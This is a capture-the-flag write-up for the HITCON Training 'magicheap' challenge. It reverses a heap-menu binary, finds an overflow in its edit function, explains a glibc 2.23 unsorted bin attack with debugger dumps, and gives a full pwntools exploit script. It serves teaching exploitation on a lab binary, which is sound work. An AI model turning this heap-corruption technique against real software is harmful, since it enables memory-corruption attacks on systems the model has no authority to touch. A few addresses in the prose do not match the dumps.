# Hitcon Training Magicheap

The goal of this challenge is to print the flag.

Let's take a look at the binary and libc:

```
$ ./libc-2.23.so
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11) stable release version 2.23, by Roland McGrath et al.
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 5.4.0 20160609.
Available extensions:
  crypt add-on version 2.1 by Michael Glad and others
  GNU Libidn by Simon Josefsson
  Native POSIX Threads Library by Ulrich Drepper et al
  BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
$ file magicheap
magicheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=7dbbc580bc50d383c3d8964b8fa0e56dbda3b5f1, not stripped
$ pwn checksec magicheap [*] '/Hackery/pod/modules/unsortedbin_attack/hitcon_magicheap/magicheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ ./magicheap
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :
```

So we can see that we are dealing with `libc-2.23.so`. Also for the binary, we are dealing with a `64` bit binary with a Canary and NX. When we run the binary, it gives us a prompt to `create/edit/delete` heaps.

## Reversing

When we take a look at the `main` function, we see this:

```
void main(void)

{
  int menuChoice;
  char input [8];
 
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  do {
    while( true ) {
      while( true ) {
        menu();
        read(0,input,8);
        menuChoice = atoi(input);
        if (menuChoice != 3) break;
        delete_heap();
      }
      if (3 < menuChoice) break;
      if (menuChoice == 1) {
        create_heap();
      }
      else {
        if (menuChoice == 2) {
          edit_heap();
        }
        else {
LAB_00400d36:
          puts("Invalid Choice");
        }
      }
    }
    if (menuChoice == 4) {
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (menuChoice != 0x1305) goto LAB_00400d36;
    if (magic < 0x1306) {
      puts("So sad !");
    }
    else {
      puts("Congrt !");
      l33t();
    }
  } while( true );
}
```

We can see that it is essentially a menu prompt. However we can see there is an additional menu option not displayed (`4869`). If we choose that option and the bss variable `magic` stored at `0x6020c0` is greater than or equal to `0x1306`, it will run the `l33t` function. Which we see gives us the flag:

```
void l33t(void)

{
  system("cat ./flag");
  return;
}
```

Next up we have the `create_heap` function:

```

void create_heap(void)

{
  int sizeInp;
  size_t mallocSize;
  void *ptr;
  long in_FS_OFFSET;
  int i;
  char local_18 [8];
  long canary;
 
  canary = *(long *)(in_FS_OFFSET + 0x28);
  i = 0;
  do {
    if (9 < i) {
code_r0x00400a31:
      if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    if (*(long *)(heaparray + (long)i * 8) == 0) {
      printf("Size of Heap : ");
      read(0,local_18,8);
      sizeInp = atoi(local_18);
      mallocSize = SEXT48(sizeInp);
      ptr = malloc(mallocSize);
      *(void **)(heaparray + (long)i * 8) = ptr;
      if (*(long *)(heaparray + (long)i * 8) == 0) {
        puts("Allocate Error");
                    /* WARNING: Subroutine does not return */
        exit(2);
      }
      printf("Content of heap:");
      read_input(*(undefined8 *)(heaparray + (long)i * 8),mallocSize,mallocSize);
      puts("SuccessFul");
      goto code_r0x00400a31;
    }
    i = i + 1;
  } while( true );
}
```

So we can see, it's a pretty standard heap allocation function. It prompts us for a size, then mallocs it and stores it in the bss array `heaparray` at `0x6020e0`. It also allows us to scan in as much data into the chunk as we specified it's size. Notice how it doesn't save the size of the chunk. Also we can see that it limits us to `10` chunks. Next up we have the `edit_chunk` function:

```

void edit_heap(void)

{
  long lVar1;
  int index;
  int size;
  long in_FS_OFFSET;
  char input [8];
  long canary;
 
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Index :");
  read(0,input,4);
  index = atoi(input);
  if ((index < 0) || (9 < index)) {
    puts("Out of bound!");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  if (*(long *)(heaparray + (long)index * 8) == 0) {
    puts("No such heap !");
  }
  else {
    printf("Size of Heap : ");
    read(0,input,8);
    size = atoi(input);
    printf("Content of heap : ");
    read_input(*(undefined8 *)(heaparray + (long)index * 8),(long)size,(long)size);
    puts("Done !");
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Here we can see it prompts us for an index to a chunk, a size for the chunk, and allows us to scan that much data into the chunk. However there is no check to see if the size of our new input is bigger than the size of the chunk itself. With this we have a heap overflow bug:

```
void delete_heap(void)

{
  int index;
  long in_FS_OFFSET;
  char input [8];
  long canary;
 
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf("Index :");
  read(0,input,4);
  index = atoi(input);
  if ((index < 0) || (9 < index)) {
    puts("Out of bound!");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  if (*(long *)(heaparray + (long)index * 8) == 0) {
    puts("No such heap !");
  }
  else {
    free(*(void **)(heaparray + (long)index * 8));
    *(undefined8 *)(heaparray + (long)index * 8) = 0;
    puts("Done !");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We can see that `delete_heap` frees the pointer for the index we give it (first it performs some checks on the index). After that it clears out the pointer. No UAF here.

## Exploitation

So we have a buffer overflow bug. We will leverage this bug to write a value to `magic` big enough to let us get the flag. We will do this using an unsorted bin attack, which will allow us to write a large integer value.

#### Unsorted Bin Attack

The Unsorted Bin contains just a single bin. All chunks are first placed in this bin, before beign moved to the other bins. The unsorted bin is a doubly linked list, with a `fwd` and `bk` pointer.

When we allocate and free a chunk of size `0xf0`, we can see it here in the unsorted bin:

```
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "magicheap", stopped, reason: SIGINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f2ac7701260 → __read_nocancel()
[#1] 0x400ca7 → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
[+] No Tcache in this version of libc
────────────────────── Fastbins for arena 0x7f2ac79ceb20 ──────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
───────────────────── Unsorted Bin for arena 'main_arena' ─────────────────────
[+] unsorted_bins[0]: fw=0x1128000, bk=0x1128000
 →   Chunk(addr=0x1128010, size=0x100, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
────────────────────── Small Bins for arena 'main_arena' ──────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────── Large Bins for arena 'main_arena' ──────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/20g 0x1128000
0x1128000:  0x0 0x101
0x1128010:  0x7f2ac79ceb78  0x7f2ac79ceb78
0x1128020:  0x0 0x0
0x1128030:  0x0 0x0
0x1128040:  0x0 0x0
0x1128050:  0x0 0x0
0x1128060:  0x0 0x0
0x1128070:  0x0 0x0
0x1128080:  0x0 0x0
0x1128090:  0x0 0x0
gef➤  x/g 0x7f2ac79ceb78
0x7f2ac79ceb78 <main_arena+88>: 0x1128400
```

So we can see that it's `fwd` and `bk` pointer (`bk` being the second) both point to `0x7f2ac79ceb78`, since there is only one thing in the unsorted bin right now. We can see that `0x7f2ac79ceb78` holds the address of the only chunk in the unsorted bin, which is `0x1128000` (the reason why it is `0x1128000` instead of `0x1128010` is because this pointer points to the start of the heap metadata rather than the user defined data).

Now this for this attack, we will be targeting the `bk` pointer at `0x1128018`. The reason for this being that there is code in `malloc/malloc.c` in the libc (this version being `libc-2.23.so`) that will write a pointer to `bk + 0x10`:


```
          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
```

Here is is setting the forward pointer of the `bk` chunk equal to the value of unsorted_chunks (av) which will be a pointer (`av` is an arena). Since the `bk` pointer points to the start of the heap metadata, the `fwd` pointer will be `0x10` bytes after that. So if we set the `bk` pointer to `magic - 0x10` then had that chunk removed from the unsorted bin, then the value of `magic` would get overwritten with a ptr to the chunk whose `bk` pointer we overwrote. This pointer's integer value should be greater than `0x1306`, and thus we should be able to print the flag.

Tl;dr Unsorted Bin Attack gives us a write of a "large" integer (in this context we don't have too much control over what gets written, only where it gets written).

Let's take a look at the memory as the Unsorted Bin Attack happens. We start off by allocating three chunks, two of size `0xf0` and one `0x30`:

```
gef➤  x/100g 0x1e23000
0x1e23000:  0x0 0x101
0x1e23010:  0x3832373533393531  0x0
0x1e23020:  0x0 0x0
0x1e23030:  0x0 0x0
0x1e23040:  0x0 0x0
0x1e23050:  0x0 0x0
0x1e23060:  0x0 0x0
0x1e23070:  0x0 0x0
0x1e23080:  0x0 0x0
0x1e23090:  0x0 0x0
0x1e230a0:  0x0 0x0
0x1e230b0:  0x0 0x0
0x1e230c0:  0x0 0x0
0x1e230d0:  0x0 0x0
0x1e230e0:  0x0 0x0
0x1e230f0:  0x0 0x0
0x1e23100:  0x0 0x101
0x1e23110:  0x3832313539333537  0x0
0x1e23120:  0x0 0x0
0x1e23130:  0x0 0x0
0x1e23140:  0x0 0x0
0x1e23150:  0x0 0x0
0x1e23160:  0x0 0x0
0x1e23170:  0x0 0x0
0x1e23180:  0x0 0x0
0x1e23190:  0x0 0x0
0x1e231a0:  0x0 0x0
0x1e231b0:  0x0 0x0
0x1e231c0:  0x0 0x0
0x1e231d0:  0x0 0x0
0x1e231e0:  0x0 0x0
0x1e231f0:  0x0 0x0
0x1e23200:  0x0 0x41
0x1e23210:  0x3832373533393530  0x0
0x1e23220:  0x0 0x0
0x1e23230:  0x0 0x0
0x1e23240:  0x0 0x20dc1
0x1e23250:  0x0 0x0
0x1e23260:  0x0 0x0
0x1e23270:  0x0 0x0
0x1e23280:  0x0 0x0
0x1e23290:  0x0 0x0
0x1e232a0:  0x0 0x0
0x1e232b0:  0x0 0x0
0x1e232c0:  0x0 0x0
0x1e232d0:  0x0 0x0
0x1e232e0:  0x0 0x0
0x1e232f0:  0x0 0x0
0x1e23300:  0x0 0x0
0x1e23310:  0x0 0x0
```

The second chunk at `0x9ea110` will be the one that we will free so it goes into the unsorted bin. The first chunk we will use to overflow into the second chunk and overwrite the `bk` pointer. The third chunk there is to prevent consolidation with the top chunk. Next up we free the second chunk, and place it in the unsorted bin:

```
gef➤  heap bins
[+] No Tcache in this version of libc
────────────────────── Fastbins for arena 0x7fe13d107b20 ──────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
───────────────────── Unsorted Bin for arena 'main_arena' ─────────────────────
[+] unsorted_bins[0]: fw=0x1e23100, bk=0x1e23100
 →   Chunk(addr=0x1e23110, size=0x100, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
────────────────────── Small Bins for arena 'main_arena' ──────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────── Large Bins for arena 'main_arena' ──────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/100g 0x1e23000
0x1e23000:  0x0 0x101
0x1e23010:  0x3832373533393531  0x0
0x1e23020:  0x0 0x0
0x1e23030:  0x0 0x0
0x1e23040:  0x0 0x0
0x1e23050:  0x0 0x0
0x1e23060:  0x0 0x0
0x1e23070:  0x0 0x0
0x1e23080:  0x0 0x0
0x1e23090:  0x0 0x0
0x1e230a0:  0x0 0x0
0x1e230b0:  0x0 0x0
0x1e230c0:  0x0 0x0
0x1e230d0:  0x0 0x0
0x1e230e0:  0x0 0x0
0x1e230f0:  0x0 0x0
0x1e23100:  0x0 0x101
0x1e23110:  0x7fe13d107b78  0x7fe13d107b78
0x1e23120:  0x0 0x0
0x1e23130:  0x0 0x0
0x1e23140:  0x0 0x0
0x1e23150:  0x0 0x0
0x1e23160:  0x0 0x0
0x1e23170:  0x0 0x0
0x1e23180:  0x0 0x0
0x1e23190:  0x0 0x0
0x1e231a0:  0x0 0x0
0x1e231b0:  0x0 0x0
0x1e231c0:  0x0 0x0
0x1e231d0:  0x0 0x0
0x1e231e0:  0x0 0x0
0x1e231f0:  0x0 0x0
0x1e23200:  0x100 0x40
0x1e23210:  0x3832373533393530  0x0
0x1e23220:  0x0 0x0
0x1e23230:  0x0 0x0
0x1e23240:  0x0 0x20dc1
0x1e23250:  0x0 0x0
0x1e23260:  0x0 0x0
0x1e23270:  0x0 0x0
0x1e23280:  0x0 0x0
0x1e23290:  0x0 0x0
0x1e232a0:  0x0 0x0
0x1e232b0:  0x0 0x0
0x1e232c0:  0x0 0x0
0x1e232d0:  0x0 0x0
0x1e232e0:  0x0 0x0
0x1e232f0:  0x0 0x0
0x1e23300:  0x0 0x0
0x1e23310:  0x0 0x0
```

So we can see that the second chunk is now in the unsorted bin. Next up we will leverage the heap overflow bug using the first chunk to overwrite the `bk` pointer at `0x9ea118` to be `0x6020c0 - 0x10 = 0x6020b0`:

```
gef➤  x/100g 0x1e23000
0x1e23000:  0x0 0x101
0x1e23010:  0x3030303030303030  0x3030303030303030
0x1e23020:  0x3030303030303030  0x3030303030303030
0x1e23030:  0x3030303030303030  0x3030303030303030
0x1e23040:  0x3030303030303030  0x3030303030303030
0x1e23050:  0x3030303030303030  0x3030303030303030
0x1e23060:  0x3030303030303030  0x3030303030303030
0x1e23070:  0x3030303030303030  0x3030303030303030
0x1e23080:  0x3030303030303030  0x3030303030303030
0x1e23090:  0x3030303030303030  0x3030303030303030
0x1e230a0:  0x3030303030303030  0x3030303030303030
0x1e230b0:  0x3030303030303030  0x3030303030303030
0x1e230c0:  0x3030303030303030  0x3030303030303030
0x1e230d0:  0x3030303030303030  0x3030303030303030
0x1e230e0:  0x3030303030303030  0x3030303030303030
0x1e230f0:  0x3030303030303030  0x3030303030303030
0x1e23100:  0x3030303030303030  0x101
0x1e23110:  0x3131313131313131  0x6020b0
0x1e23120:  0x0 0x0
0x1e23130:  0x0 0x0
0x1e23140:  0x0 0x0
0x1e23150:  0x0 0x0
0x1e23160:  0x0 0x0
0x1e23170:  0x0 0x0
0x1e23180:  0x0 0x0
0x1e23190:  0x0 0x0
0x1e231a0:  0x0 0x0
0x1e231b0:  0x0 0x0
0x1e231c0:  0x0 0x0
0x1e231d0:  0x0 0x0
0x1e231e0:  0x0 0x0
0x1e231f0:  0x0 0x0
0x1e23200:  0x100 0x40
0x1e23210:  0x3832373533393530  0x0
0x1e23220:  0x0 0x0
0x1e23230:  0x0 0x0
0x1e23240:  0x0 0x20dc1
0x1e23250:  0x0 0x0
0x1e23260:  0x0 0x0
0x1e23270:  0x0 0x0
0x1e23280:  0x0 0x0
0x1e23290:  0x0 0x0
0x1e232a0:  0x0 0x0
0x1e232b0:  0x0 0x0
0x1e232c0:  0x0 0x0
0x1e232d0:  0x0 0x0
0x1e232e0:  0x0 0x0
0x1e232f0:  0x0 0x0
0x1e23300:  0x0 0x0
0x1e23310:  0x0 0x0
gef➤  x/g 0x6020c0
0x6020c0 <magic>: 0x0
```

So we can see that the `bk` pointer has been overwritten to `0x6020b0`, and that the value of `magic` is `0x0`. Now we will allocate a `0xf0` byte chunk to remove this chunk from the unsorted bin and trigger the write:

```
gef➤  x/100g 0x1e23000
0x1e23000:  0x0 0x101
0x1e23010:  0x3030303030303030  0x3030303030303030
0x1e23020:  0x3030303030303030  0x3030303030303030
0x1e23030:  0x3030303030303030  0x3030303030303030
0x1e23040:  0x3030303030303030  0x3030303030303030
0x1e23050:  0x3030303030303030  0x3030303030303030
0x1e23060:  0x3030303030303030  0x3030303030303030
0x1e23070:  0x3030303030303030  0x3030303030303030
0x1e23080:  0x3030303030303030  0x3030303030303030
0x1e23090:  0x3030303030303030  0x3030303030303030
0x1e230a0:  0x3030303030303030  0x3030303030303030
0x1e230b0:  0x3030303030303030  0x3030303030303030
0x1e230c0:  0x3030303030303030  0x3030303030303030
0x1e230d0:  0x3030303030303030  0x3030303030303030
0x1e230e0:  0x3030303030303030  0x3030303030303030
0x1e230f0:  0x3030303030303030  0x3030303030303030
0x1e23100:  0x3030303030303030  0x101
0x1e23110:  0x3131313130303030  0x6020b0
0x1e23120:  0x0 0x0
0x1e23130:  0x0 0x0
0x1e23140:  0x0 0x0
0x1e23150:  0x0 0x0
0x1e23160:  0x0 0x0
0x1e23170:  0x0 0x0
0x1e23180:  0x0 0x0
0x1e23190:  0x0 0x0
0x1e231a0:  0x0 0x0
0x1e231b0:  0x0 0x0
0x1e231c0:  0x0 0x0
0x1e231d0:  0x0 0x0
0x1e231e0:  0x0 0x0
0x1e231f0:  0x0 0x0
0x1e23200:  0x100 0x41
0x1e23210:  0x3832373533393530  0x0
0x1e23220:  0x0 0x0
0x1e23230:  0x0 0x0
0x1e23240:  0x0 0x20dc1
0x1e23250:  0x0 0x0
0x1e23260:  0x0 0x0
0x1e23270:  0x0 0x0
0x1e23280:  0x0 0x0
0x1e23290:  0x0 0x0
0x1e232a0:  0x0 0x0
0x1e232b0:  0x0 0x0
0x1e232c0:  0x0 0x0
0x1e232d0:  0x0 0x0
0x1e232e0:  0x0 0x0
0x1e232f0:  0x0 0x0
0x1e23300:  0x0 0x0
0x1e23310:  0x0 0x0
gef➤  x/g 0x6020c0
0x6020c0 <magic>: 0x7fe13d107b78
```

With that, we can get the flag!

## Exploit

Putting it all together, we have the following exploit:

```
from pwn import *

target = process('./magicheap')
#gdb.attach(target)

def add(size, content):
  print target.recvuntil("Your choice :")
  target.sendline("1")
  print target.recvuntil("Size of Heap : ")
  target.sendline(str(size))
  print target.recvuntil("Content of heap:")
  target.send(content)


def edit(index, size, content):
  print target.recvuntil("Your choice :")
  target.sendline("2")
  print target.recvuntil("Index :")
  target.sendline(str(index))
  print target.recvuntil("Size of Heap : ")
  target.sendline(str(size))
  #print target.recvuntil("Content of heap:")
  target.sendline(content)

def delete(index):
  print target.recvuntil("Your choice :")
  target.sendline("3")
  print target.recvuntil("Index :")
  target.sendline(str(index))

# Declare the target variable
magic = 0x6020c0

# Allocate our three chunks
add(0xf0, "15935728")# 0
add(0xf0, "75395128")# 1
add(0x30, "05935728")# 2

# Free the middle chunk, add it to the unsorted bin
delete(1)

# Overwrite the bk pointer of the chunk in the unsorted bin
edit(0, 0x110, "0"*0xf8 + p64(0x101) + "1"*0x8 + p64(magic - 0x10))

# Reallocate chunk 1 to remove it from the unsorted bin, and trigger the write
add(0xf0, "0000")

# Send the option to get the flag
target.sendline("4869")


target.interactive()
```

When we run it:

```
$ python exploit.py
[+] Starting local process './magicheap': pid 21548
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :
Size of Heap :
Content of heap:
SuccessFul
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :
Size of Heap :
Content of heap:
SuccessFul
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :
Size of Heap :
Content of heap:
SuccessFul
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :
Index :
Done !
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :
Index :
Size of Heap :
Content of heap : Done !
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :
Invalid Choice
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :Size of Heap :
Content of heap:
[*] Switching to interactive mode
SuccessFul
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :Congrt !
flag{unsorted_bin_attack}
--------------------------------
       Magic Heap Creator       
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :$
[*] Interrupted
[*] Stopped process './magicheap' (pid 21548)
```

Just like that, we got the flag!